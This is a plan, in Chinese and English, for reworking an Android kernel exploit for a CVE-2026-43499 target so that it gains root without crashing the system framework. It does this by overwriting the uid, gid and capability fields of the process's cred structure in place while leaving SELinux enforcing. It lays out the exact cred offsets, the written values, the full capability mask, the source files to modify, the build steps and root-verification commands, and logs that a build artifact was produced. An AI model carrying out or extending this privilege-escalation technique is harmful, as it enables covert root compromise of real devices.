# Plan: In-place Cred Patch — root 不杀 framework

## Problem

当前 exploit（violin direct pselect path）的提权流程：
1. `selinux_enforcing = 0` → SELinux Permissive
2. `task->cred = init_cred` → uid=0

Step 1 立刻杀掉 framework（zygote 设 context 失败 → system_server 崩 → 黑屏）。

## Root Cause

`init_cred` 是内核全局静态 cred，其 SELinux SID = kernel_sid(1)，不是 shell。要让进程用这个 cred 运行，必须先关 enforcing。关 enforcing → 全局 policy 失效 → framework 死。

## Solution

**不换 cred 指针，只改 cred 结构体内的 uid/gid/caps 字段。**

参考 caiman pipe-based path 的 `patch_cred_identity()`（`root.c:360-508`），用 pselect write 原语做同样的事：

### Write Plan

先读 `task->cred` 指针（shape-0 read），然后对 cred 结构体做10次 pselect write：

| # | Target (cred_addr +) | Value | Size | Field |
|---|---------------------|-------|------|-------|
| 0 | +8  | 0x0 | 8B | uid + gid |
| 1 | +16 | 0x0 | 8B | suid + sgid |
| 2 | +24 | 0x0 | 8B | euid + egid |
| 3 | +32 | 0x0 | 8B | fsuid + fsgid |
| 4 | +40 | 0x0 | 8B | securebits |
| 5 | +48 | CAP_FULL | 8B | cap_inheritable |
| 6 | +56 | CAP_FULL | 8B | cap_permitted |
| 7 | +64 | CAP_FULL | 8B | cap_effective |
| 8 | +72 | CAP_FULL | 8B | cap_bset |
| 9 | +80 | CAP_FULL | 8B | cap_ambient |

`CAP_FULL = 0x000001ffffffffffULL`

### What's NOT touched

- `cred + 128` (security pointer) → SELinux SID 保持 shell
- `selinux_enforcing` → 保持 1（Enforcing）
- `task->real_cred` / `task->cred` 指针 → 不变

### Result

```
$ id
uid=0(root) gid=0(root) groups=0(root),... context=u:r:shell:s0
```

- uid=0，full caps → 可以做 root 操作
- SELinux Enforcing + shell context → framework 不受影响
- zygote/system_server 正常运行
- 不需要 reboot

### 不适用的场景

- 需要切换到 su domain 的操作（需要 permissive 或 su 策略）
- install_embedded_su（需要写 /system 分区，可能被 SELinux 拦）

### 实现方式

修改 `exploit-repo/IonStack/CVE-2026-43499/exploit/src/fops.c`：

1. 新增 `direct_cred_patch_inplace()` 函数
2. 替换 `direct_cred_replace()` 中的 init_cred 写入逻辑
3. 去掉 selinux_enforcing 写入
4. `make PROJECT=violin-v-oss` 重新编译
5. 推送测试

## Files to Modify

- `exploit-repo/IonStack/CVE-2026-43499/exploit/src/fops.c` — 主要修改
- `exploit-repo/IonStack/CVE-2026-43499/exploit/src/targets/violin-v-oss/target.h` — 可能需要添加偏移量常量

## Verification

```bash
# 1. 先 p.so（如果还需要 permissive 的场景）
# 2. 运行新 SO
LD_PRELOAD=/data/local/tmp/new_root.so id
# 预期: uid=0(root) context=u:r:shell:s0

# 3. 验证 framework 没死
adb shell service list | wc -l
# 预期: ~438 services

# 4. 验证 SELinux 仍 enforcing
adb shell getenforce
# 预期: Enforcing
```

## 2026-07-23 实际执行覆盖

- 附件 `r.so/r2.so` 属于 direct Linuxoid 架构，不是当前 `exploit/src/fops.c` 的同一源码链；本轮没有修改当前 exploit repo，而是在 `session-20260723-cred-patch/build-so/source/` 隔离实现。
- `r.so` 反汇编确认 image base 为 `0xffffffc080000000`；旧 target 的 `0xffffffc008000000` 不作为该 artifact 的复现 base。
- 候选先读 `task->real_cred`/`task->cred`，再对 pointed cred 对象写十个 qword：uid/gid 归零、securebits 归零、五组 capability 为 `0x000001ffffffffff`；pointer slots、`cred+128 security`、kernel `selinux_enforcing` 和 policy reload 均保持不动。
- 当前 build-only 候选：`session-20260723-cred-patch/build-so/inplace-preload.so`，89800 bytes，SHA256 `31997ea1ff19ce6b831cbf0f4c73a041a5458e9a5ead080b238a09b3e1185920`。没有设备 runtime proof，不能执行“已 root”结论。
